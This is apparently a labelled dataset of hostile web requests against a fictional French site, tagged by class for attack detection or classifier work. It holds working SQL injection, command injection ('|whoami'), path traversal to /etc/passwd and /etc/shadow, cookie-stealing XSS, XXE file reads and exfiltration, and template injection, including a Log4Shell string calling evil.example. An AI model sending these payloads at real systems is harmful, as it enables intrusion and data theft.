+MODELE	/inscription/etudiant?nom=${7*7}
+TRAVERSEE	/static/..%2f..%2f..%2fetc%2fshadow
+SQLI	/notes/releve?nom=SLEEP%281%29%20%2F%2A%E2%80%98%20or%20SLEEP%281%29%20or%20%E2%80%98%E2%80%9C%20or%20SLEEP%281%29%20or%20%E2%80%9C%2A%2F
+SQLI	/article?id=' UNION ALL SELECT NULL,version()--&page=14
+COMMANDE	/recherche?filtre=%250A%2520str%253D%2524%2528echo%2520NNDFMH%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25205%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%2527&page=2
+TRAVERSEE	/boutique/produit?filtre=/./././././././././././boot.ini&page=2
+COMMANDE	/bibliotheque/ouvrage?code=%29%3B%7Dprint%28%60echo%2520KAYVRD%5Cnecho%2520%24%28%284%252B54%29%29%5Cnecho%2520KAYVRD%5Cnecho%2520KAYVRD%60%29%253B%2525252529%252525257DKAYVRD
+SQLI	/boutique/produit?nom=") or ("x")=("x&page=13
+TRAVERSEE	/bibliotheque/ouvrage?id=%2Fusr%2Flocal%2Fetc%2Fapache2%2Fconf%2Fhttpd.conf
+COMMANDE	/recherche?nom=')print(`echo%20OFKEZB;echo%20$((35%2B78));echo%20OFKEZB;echo%20OFKEZB`)%3B%2523OFKEZB&page=15
+XSS	/index.php?recherche=%253Cscript%253Exhr%3Dnew%2520ActiveXObject%2528%2522Msxml2.XMLHTTP%2522%2529%3Bxhr.open%2528%2522GET%2522%2C%2522%2Fxssme2%2522%2Ctrue%2529%3Bxhr.onreadystatechange%3Dfunction%2528%2529%7Bif%2528xhr.readyState%3D%3D4%2526%2526xhr.status%3D%3D200%2529%7Balert%2528xhr.responseText.match%2528%2F%2527%2528%5B%5E%2527%5D%252b%2529%2F%2529%5B1%5D%2529%7D%7D%3Bxhr.send%2528%2529%3B%253C%2Fscript%253E
+COMMANDE	/article?code=echo%24IFSODFQBQ%24%28%2897%252B35%29%29%24%28echo%24IFSODFQBQ%29ODFQBQ%2526
+SQLI	/catalogue?annee="&"
+TRAVERSEE	/api/v1/equipements?recherche=..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror.log
+SQLI	/boutique/produit?ref=admin%22%29%20or%20%28%221%22%3D%221%22--
+COMMANDE	/recherche?filtre=%0A%20str%3D%24%28echo%20DPBAVN%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27
+XSS	/article?ref=%3Ca%20href%3D%22javascript%26colon%3B%5Cu0061%26%23x6C%3B%26%23101%2572t%26lpar%3B1%26rpar%3B%22%3E%3Cbutton%3E
+SQLI	/intranet/dossier?nom=or true--&page=4
+SQLI	/article?recherche='; EXEC xp_cmdshell('dir')--
+MODELE	/api/v1/equipements?nom=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D
+TRAVERSEE	/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+TRAVERSEE	/documents/Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA%3D%3D
+SQLI	/actualites?annee=admin" or "1"="1"#&page=16
+MODELE	/intranet/dossier?recherche={{=42*42}}&page=2
+TRAVERSEE	/intranet/dossier?recherche=..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror_log
+SQLI	/espace/connexion?utilisateur=%27%20OR%201%3D1--&motdepasse=xxxx
+TRAVERSEE	/bibliotheque/ouvrage?code=....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+SQLI	/api/v1/equipements?annee=1%22
+SQLI	/bibliotheque/ouvrage?annee=1234%20%27%20AND%201%3D0%20UNION%20ALL%20SELECT%20%27admin%27%2C%20%2781dc9bdb52d04dc20036dbd8313ed055
+MODELE	/intranet/dossier?filtre=%7B42%2A42%7D
+COMMANDE	/notes/releve?q=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520MATZOK%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25202%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%25252F%25252F&page=1
+COMMANDE	/api/v1/equipements?code=%29%3B%7Dprint%28%60echo%2520DSHIRJ%5Cnecho%2520%24%28%2854%252B41%29%29%5Cnecho%2520DSHIRJ%5Cnecho%2520DSHIRJ%60%29%253B.%2525252522DSHIRJ&page=19
+TRAVERSEE	/index.php?q=passwd.dat
+XXE	/actualites?annee=%3Cname%3E%27%2C%27%27%29%29%3B%20phpinfo%28%29%3B%20exit%3B%2F%2A%3C%2Fname%3E
+SQLI	/index.php?id=%27%3B%20EXEC%20xp_cmdshell%28%27dir%27%29--
+XXE	/inscription/etudiant?code=%3Cfoo%3E%3C%21%5BCDATA%5B%3C%5D%5D%3ESCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3Ealert%28%27XSS%27%29%3B%3C%21%5BCDATA%5B%3C%5D%5D%3E%2FSCRIPT%3C%21%5BCDATA%5B%3E%5D%5D%3E%3C%2Ffoo%3E
+XXE	/catalogue?tri=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+XSS	/notes/releve?nom=%3Ctextarea%20id%3Dta%20onfocus%3Dconsole.dir%28event.currentTarget.ownerDocument.location.href%3D%2526quot%3Bjavascript%3A%5C%2526quot%3B%2526lt%3Bscript%2526gt%3Bvar%252520xhr%252520%25253D%252520new%252520XMLHttpRequest%28%29%25253Bxhr.open%28%27GET%27%25252C%252520%27http%25253A%25252F%25252Fhtml5sec.org%25252Fxssme2%27%25252C%252520true%29%25253Bxhr.onload%252520%25253D%252520function%28%29%252520%25257B%252520alert%28xhr.responseText.match%28%25252Fcookie%252520%25253D%252520%27%28.%2A%25253F%29%27%25252F%29%25255B&page=3
+XSS	/catalogue?nom=%3Cform%3E%3Cbutton%20formaction%3Djavascript%26colon%3Balert%281%29%3ECLICKME
+XSS	/inscription/etudiant?code=%3Cscript%3E%20var%2BMouseEvent%3Dfunction%2BMouseEvent%28%29%7B%7D%3B%20MouseEvent%3DMouseEvent%20var%2Btest%3Dnew%2BMouseEvent%28%29%3B%20test.isTrusted%3Dtrue%3B%20test.type%3D%27click%27%3B%20%20document.getElementById%28%2522safe123%2522%29.click%3Dfunction%28%29%2B%7Balert%28Safe.get%28%29%29%3B%7D%20document.getElementById%28%2522safe123%2522%29.click%28test%29%3B%20%3C%2Fscript%3E
+SQLI	/notes/releve?tri=1%2F%2A%211111%27%2A%2F&page=2
+SQLI	/produits?page=" or "x"="x
+XSS	/recherche?ref=%3Ca%20href%3D%22data%3Atext%2Fhtml%3Bbase64_%2C%3Csvg%2Fonload%3D%5Cu0061%26%23x6C%3B%26%23101%2572t%281%29%3E%22%3EX%3C%2Fa&page=1
+XXE	/intranet/dossier?q=<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://127.0.0.1:21/%data3;'>">&page=12
+SQLI	/catalogue?annee=admin'or 1=1 or ''='
+SQLI	/index.php?id=admin%27%29%20or%20%271%27%3D%271%27%23
+TRAVERSEE	/documents//var/log/apache-ssl/access.log
+SQLI	/notes/releve?recherche=1'
+COMMANDE	/actualites?nom=%2522%3B%20str%3D%24%28echo%20BUMBBO%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C
+XSS	/catalogue?nom=<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); }
+COMMANDE	/api/v1/equipements?q=%27%3B%20str%3D%24%28echo%20FBVDTE%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522&page=19
+TRAVERSEE	/telechargement//etc/opt/ipf/ipf.conf
+TRAVERSEE	/fichiers//etc/pureftpd.pdb
+COMMANDE	/actualites?nom=%26%26echo%2520FEYLRM%24%28%2881%252B59%29%29%24%28echo%2520FEYLRM%29FEYLRM%2527
+SQLI	/catalogue?ref=%27%29%20or%20true--
+XXE	/produits?page=%3Cxsl%3Astylesheet%20version%3D%221.0%22%20xmlns%3Axsl%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2FXSL%2FTransform%22%20xmlns%3Aphp%3D%22http%3A%2F%2Fphp.net%2Fxsl%22%3E%3Cxsl%3Atemplate%20match%3D%22%2F%22%3E%3Cxsl%3Avalue-of%20select%3D%22php%3Afunction%28%27passthru%27%2C%27ls%20-la%27%29%22%2F%3E%3C%2Fxsl%3Atemplate%3E%3C%2Fxsl%3Astylesheet%3E
+TRAVERSEE	/intranet/dossier?tri=%2Fapache2%2Flogs%2Faccess_log
+MODELE	/actualites?code=%7B%7Bconfig.items%28%29%7D%7D&page=9
+COMMANDE	/bibliotheque/ouvrage?id=%7Cecho%2520OBEPVB%24%28%2899%252B41%29%29%24%28echo%2520OBEPVB%29OBEPVB%2527
+COMMANDE	/actualites?q=%7C%7Cecho%2520JFXLVC%24%28%2883%252B84%29%29%24%28echo%2520JFXLVC%29JFXLVC%255C%255C
+SQLI	/api/v1/equipements?code=admin%27%20or%201%3D1%2F%2A
+XXE	/article?code=%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%20%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%20%3E%5D%3E&page=9
+COMMANDE	/index.php?q=%253B%2520str%253D%2524%2528echo%2520MJSZOL%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25202%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%2F%2F
+SQLI	/inscription/etudiant?ref=admin%27%29%20or%20%271%27%3D%271%27%2F%2A
+TRAVERSEE	/notes/releve?tri=%2F%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..%2525%255c..winnt%2Fdesktop.ini
+COMMANDE	/article?tri=%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20KJBKAZ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20&page=3
+COMMANDE	/produits?page=%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ENIIMV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23&page=3
+SQLI	/index.php?q=admin"or 1=1 or ""="
+COMMANDE	/intranet/dossier?ref='%26%26echo%20YBQKFD$((48%2B31))$(echo%20YBQKFD)YBQKFD"
+TRAVERSEE	/documents//..%5C..%5C..%5C..%5C..%5C..%5Cwinnt%5Cwin.ini
+TRAVERSEE	//etc/apache2/conf/httpd.conf
+COMMANDE	/inscription/etudiant?ref=%7C%20%5B%204%20-ne%20%24%28echo%20LAMXKC%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522
+TRAVERSEE	/actualites?nom=/etc/master.passwd
+TRAVERSEE	//var/log/yum.log
+COMMANDE	/catalogue?tri=%252527%257C%2520%255B%25203%2520-ne%2520%2524%2528echo%2520IQYBMK%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%257C
+TRAVERSEE	/static//etc/hosts.equiv
+SQLI	/actualites?q=1
+XSS	/boutique/produit?annee=<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?&page=15
+COMMANDE	/boutique/produit?code=%252527%250A%2520str%253D%2524%2528echo%2520JZOJBE%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25209%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%25252F%25252F
+SQLI	/boutique/produit?tri='&'&page=19
+SQLI	/notes/releve?tri=admin%22%20or%20%221%22%3D%221
+COMMANDE	/article?page=%3Becho%2520KHCYPO%24%28%2877%252B38%29%29%24%28echo%2520KHCYPO%29KHCYPO%5C
+SQLI	/index.php?annee=or%201%3D1%23&page=8
+SQLI	/index.php?q=admin" #
+SQLI	/bibliotheque/ouvrage?recherche=admin') or ('1'='1'/*
+COMMANDE	/intranet/dossier?code=echo$IFSAAZQPF$((47%2B0))$(echo$IFSAAZQPF)AAZQPF|&page=6
+TRAVERSEE	/catalogue?tri=..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror_log&page=3
+SQLI	/notes/releve?tri=admin%22%20--
+TRAVERSEE	/static//etc/proftpd/modules.conf
+XSS	/actualites?nom=%3Cscript%3Evar%20script%20%3D%20document.getElementsByTagName%28%27script%27%29%5B0%5D%3B%20var%20clone%20%3D%20script.childNodes%5B0%5D.cloneNode%28true%29%3B%20var%20ta%20%3D%20document.createElement%28%27textarea%27%29%3B%20ta.appendChild%28clone%29%3B%20alert%28ta.value.match%28%2Fcookie%20%3D%20%27%28.%2A%3F%29%27%2F%29%5B1%5D%29%3C%2Fscript%3E
+SQLI	/recherche?page=1234%20%22%20AND%201%3D0%20UNION%20ALL%20SELECT%20%22admin%22%2C%20%2281dc9bdb52d04dc20036dbd8313ed055
+SQLI	/index.php?tri=' AND extractvalue(1,concat(0x7e,version()))--
+SQLI	/login?utilisateur=admin%27%29%20or%20%271%27%3D%271&motdepasse=xxxxxx
+MODELE	/recherche?annee=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%7D%7D
+SQLI	/recherche?tri=" or ""-"
+TRAVERSEE	/static//usr/local/etc/apache/vhosts.conf
+COMMANDE	/api/v1/equipements?filtre=%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20FRMTBN%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527&page=19
+COMMANDE	/index.php?id=%253B%2520str%253D%2524%2528echo%2520OXFDXC%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25203%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%252522
+XXE	/notes/releve?filtre=<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>
+SQLI	/recherche?nom=admin%27%20or%201%3D1--
+COMMANDE	/article?nom=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520OGQLYS%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25207%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2522&page=18
+SQLI	/login?utilisateur=admin%22%20or%201%3D1%23&motdepasse=xxxx
+TRAVERSEE	/telechargement//var/log/httpd/error_log
+XXE	/notes/releve?recherche=count(/child::node())
+XSS	/catalogue?page=%3Cscript%20itworksinallbrowsers%3E%2F%2A%3Cscript%2A%20%2A%2Falert%281%29%3C%2Fscript%20%3F
+SQLI	/api/v1/equipements?ref=admin' or 1=1/*&page=14
+COMMANDE	/index.php?page=%7Cecho$IFSYRTPVW$((55%2B57))$(echo$IFSYRTPVW)YRTPVW"
+XSS	/bibliotheque/ouvrage?ref=<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
+COMMANDE	/index.php?page=%252527%250A%2520str%253D%2524%2528echo%2520GGPYAR%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25203%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%252522
+XSS	/notes/releve?recherche=%3Cscript%2Fsrc%3D%26%23100%26%2397%26%23116%26%2397%3Atext%2F%26%23x6a%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x000070%26%23x074%2C%26%23x0061%3B%26%23x06c%3B%26%23x0065%3B%26%23x00000072%3B%26%23x00074%3B%281%29%3E%3C%2Fscript%3E%20%3F
+TRAVERSEE	/telechargement//var/log/news/news.all
+XXE	/catalogue?ref=<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>&page=18
+SQLI	/espace/connexion?utilisateur=1%60&motdepasse=xxxx
+COMMANDE	/index.php?ref=%26%20sleep%200%20%26%26%20str%3D%24%28echo%20TKDFPY%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%5C%5C
+SQLI	/index.php?page=admin%22%20or%201%3D1%23
+SQLI	/produits?q=admin" #
+SQLI	/inscription/etudiant?annee=%27%20OR%20%271%27%3D%271&page=2
+SQLI	/notes/releve?ref=")) or (("x"))=(("x
+COMMANDE	/produits?page=echo%20CWRXRJ$((77%2B13))$(echo%20CWRXRJ)CWRXRJ
+COMMANDE	/intranet/dossier?code=%253B%2520str%253D%2524%2528echo%2520OXFDXC%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25205%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%252522
+COMMANDE	/actualites?tri=%26%20sleep%200%20%26%26%20str%3D%24%28echo%20HIXNBS%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%26&page=20
+XSS	/recherche?annee=%3Cembed%20src%3D%22http%3A%2F%2Fcorkami.googlecode.com%2Fsvn%2F%21svn%2Fbc%2F480%2Ftrunk%2Fmisc%2Fpdf%2Fhelloworld_js_X.pdf%22%3E%20%3F&page=10
+SQLI	/api/v1/equipements?nom=admin%27or%201%3D1%20or%20%27%27%3D%27
+SQLI	/connexion?utilisateur=admin%27%20or%20%271%27%3D%271&motdepasse=xxxxxxxxx
+SQLI	/connexion?utilisateur=1%20AND%20%28SELECT%201%20FROM%20%28SELECT%20SLEEP%285%29%29a%29&motdepasse=xxxxxxxxx
+COMMANDE	/actualites?id=%257C%2520%255B%25202%2520-ne%2520%2524%2528echo%2520MRDZPJ%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%2522
+SQLI	/article?nom='*'
+TRAVERSEE	/telechargement/..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+XSS	/bibliotheque/ouvrage?filtre=%3Ciframe%20src%3D%2F%20onload%3Deval%28unescape%28this.name.replace%28%2F%5C%2Fg%2Cnull%29%29%29%20name%3Dfff%25253Dnew%252520this.contentWindow.window.XMLHttpRequest%252528%252529%25253Bfff.open%252528%252522GET%252522%25252C%252522xssme2%252522%252529%25253Bfff.onreadystatechange%25253Dfunction%252528%252529%25257Bif%252520%252528fff.readyState%25253D%25253D4%252520%252526%252526%252520fff.status%25253D%25253D200%252529%25257Balert%252528fff.responseText%252529%25253B%25257D%25257D%25253Bfff.send%252
+COMMANDE	/api/v1/equipements?filtre=%20echo%20GQTWXI$((72%2B93))$(echo%20GQTWXI)GQTWXI\
+SQLI	/inscription/etudiant?nom='-'&page=18
+TRAVERSEE	/boutique/produit?page=..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%2500
+SQLI	/article?q=%27-%27
+TRAVERSEE	/boutique/produit?id=..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
+SQLI	/actualites?id=%27%20OR%20%271%27%3D%271&page=10
+SQLI	/index.php?tri=admin%27--
+COMMANDE	/inscription/etudiant?ref=%7Cwhoami
+TRAVERSEE	/c:\Program Files\Apache Group\Apache\logs\error.log
+TRAVERSEE	/actualites?filtre=%2Fvar%2Flog%2Fthttpd_log
+XSS	/actualites?annee=%3Cscript%3E%20location.href%20%3D%20%27data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio%2FKScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4%3D%27%3B%20%3C%2Fscript%3E
+SQLI	/actualites?code=' or 'x'='x&page=13
+COMMANDE	/inscription/etudiant?nom=%257C%257Cecho%24IFSXRRNLV%24%28%2842%252B73%29%29%24%28echo%24IFSXRRNLV%29XRRNLV%5C
+TRAVERSEE	/static//var/spool/locks
+XSS	/boutique/produit?id=<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????
+SQLI	/bibliotheque/ouvrage?nom=%22%20or%20%22%22%2A%22
+TRAVERSEE	/intranet/dossier?code=%2Fusr%2Flocal%2Fapache%2Fconf%2Fphp.ini
+TRAVERSEE	//etc/wu-ftpd/ftphosts
+COMMANDE	/boutique/produit?tri=%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520ZPLJWX%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25204%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%252526
+TRAVERSEE	/index.php?q=../../../../../var/www/logs/error_log
+COMMANDE	/catalogue?q=%7Cecho%24IFSRLIAHI%24%28%2826%252B64%29%29%24%28echo%24IFSRLIAHI%29RLIAHI%252F%252F
+COMMANDE	/index.php?recherche=";echo$IFSGDUPZJ$((65%2B72))$(echo$IFSGDUPZJ)GDUPZJ"&page=1
+SQLI	/espace/connexion?utilisateur=%27%20%27&motdepasse=xxxxxxxxx
+COMMANDE	/catalogue?filtre=${shell_exec(print(`echo%20CVXUUB\necho%20$((15%2B41))\necho%20CVXUUB\necho%20CVXUUB`)%3B//CVXUUB
+COMMANDE	/inscription/etudiant?ref=%7C%20%5B%207%20-ne%20%24%28echo%20QJDBJN%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27
+XSS	/catalogue?tri=%3Ca%20href%3Djavascript%26colon%3Balert%26lpar%3Bdocument%26period%3Bcookie%26rpar%3B%3EClick%20Here%3C%2Fa%3E
+MODELE	/produits?code=%24%7Bdonotexists%7C42%2A42%7D
+TRAVERSEE	/static//etc/pureftpd.passwd
+COMMANDE	/catalogue?q=%2522%250A%2520str%253D%2524%2528echo%2520VDEVWJ%2529%250A%2520str1%253D%2524%257B%2523str%257D%250A%2520if%2520%255B%25203%2520-ne%2520%2524%257Bstr1%257D%2520%255D%250A%2520then%2520sleep%25200%250A%2520else%2520sleep%25201%250A%2520fi%2520%25252F%25252F&page=3
+SQLI	/notes/releve?page=admin") or "1"="1&page=18
+COMMANDE	/recherche?recherche=%2526echo%24IFSYETOFB%24%28%2893%252B7%29%29%24%28echo%24IFSYETOFB%29YETOFB&page=10
+TRAVERSEE	/telechargement/..\../..\../..\../..\../boot.ini
+COMMANDE	/recherche?filtre=%60uname%20-a%60&page=5
+SQLI	/espace/connexion?utilisateur=1%2F%2A%211111%27%2A%2F&motdepasse=xxxxxxx
+SQLI	/recherche?annee=SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/ FROM some_table WHERE ex = ample&page=16
+TRAVERSEE	/index.php?tri=/var/log/httpd/access_log&page=4
+COMMANDE	/notes/releve?id=|echo$IFSGKBHIR$((84%2B74))$(echo$IFSGKBHIR)GKBHIR'
+SQLI	/espace/connexion?utilisateur=admin%22%20or%20%221%22%3D%221%22--&motdepasse=xxxxxxxxx
+MODELE	/inscription/etudiant?recherche=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%7D&page=2
+SQLI	/boutique/produit?recherche=admin'/*
+TRAVERSEE	/boutique/produit?filtre=%2Fvar%2Fadm%2Facct%2Fsum%2Floginlog
+SQLI	/espace/connexion?utilisateur=%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--&motdepasse=xxxxxx
+TRAVERSEE	/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd
+MODELE	/article?annee=%7B%7B7%2A7%7D%7D&page=8
+TRAVERSEE	/actualites?q=/private/etc/httpd/httpd.conf&page=8
+SQLI	/espace/connexion?utilisateur=%27%20or%20%27%27%20%27&motdepasse=xxxxxxx
+SQLI	/boutique/produit?tri=SLEEP%281%29%20%2F%2A%E2%80%98%20or%20SLEEP%281%29%20or%20%E2%80%98%E2%80%9C%20or%20SLEEP%281%29%20or%20%E2%80%9C%2A%2F
+SQLI	/recherche?ref=%22%2A%22&page=14
+TRAVERSEE	/bibliotheque/ouvrage?id=%2Fvar%2Fwww%2Fconf%2Fhttpd.conf
+SQLI	/article?annee=admin%27%29%20or%20%28%271%27%3D%271%27%23
+TRAVERSEE	/notes/releve?annee=%5C%5C%26apos%3B%2Fbin%2Fcat%2520%2Fetc%2Fpasswd%5C%5C%26apos%3B
+SQLI	/index.php?recherche=%22%29%20or%20%28%22x%22%29%3D%28%22x
+TRAVERSEE	/boutique/produit?ref=/etc/syslogd.conf&page=14
+COMMANDE	/boutique/produit?ref=%2526echo%2520NQPWBV%24%28%2816%252B77%29%29%24%28echo%2520NQPWBV%29NQPWBV
+SQLI	/intranet/dossier?page=admin" or 1=1#&page=3
+XXE	/catalogue?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ELEMENT%20foo%20ANY%20%3E%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fissue%22%20%3E%5D%3E
+TRAVERSEE	/recherche?nom=%2Fusr%2Flocal%2Fapache%2Flog
+XXE	/api/v1/equipements?filtre=%3Cxsl%3Astylesheet%20version%3D%221.0%22%20xmlns%3Axsl%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2FXSL%2FTransform%22%20xmlns%3Aphp%3D%22http%3A%2F%2Fphp.net%2Fxsl%22%3E%3Cxsl%3Atemplate%20match%3D%22%2F%22%3E%3Cxsl%3Acopy-of%20select%3D%22document%28%27%2Fetc%2Fpasswd%27%29%22%2F%3E%3C%2Fxsl%3Atemplate%3E%3C%2Fxsl%3Astylesheet%3E&page=20
+TRAVERSEE	/telechargement//etc/wtmp
+XXE	/inscription/etudiant?id=<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+TRAVERSEE	/boutique/produit?id=c%3A%5CSystem32%5CInetsrv%5Cmetabase.xml
+TRAVERSEE	//etc/updatedb.conf
+SQLI	/intranet/dossier?ref=admin%27%29%20or%20%271%27%3D%271%27--&page=14
+TRAVERSEE	/documents//opt/lampp/logs/access.log
+COMMANDE	/index.php?nom=||echo%20QUULXG$((42%2B65))$(echo%20QUULXG)QUULXG|
+COMMANDE	/produits?filtre=%252527%257C%2520%255B%25202%2520-ne%2520%2524%2528echo%2520HYWCTJ%2520%257C%2520tr%2520-d%2520%2527%255Cn%2527%2520%257C%2520wc%2520-c%2529%2520%255D%2520%257C%257C%2520sleep%25201%2520%2F%2F
+TRAVERSEE	/documents/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd
+SQLI	/recherche?q=%27%20or%20%27x%27%3D%27x
+TRAVERSEE	/fichiers//var/adm/log/xferlog
+SQLI	/actualites?q=1'||'asd'||'&page=20
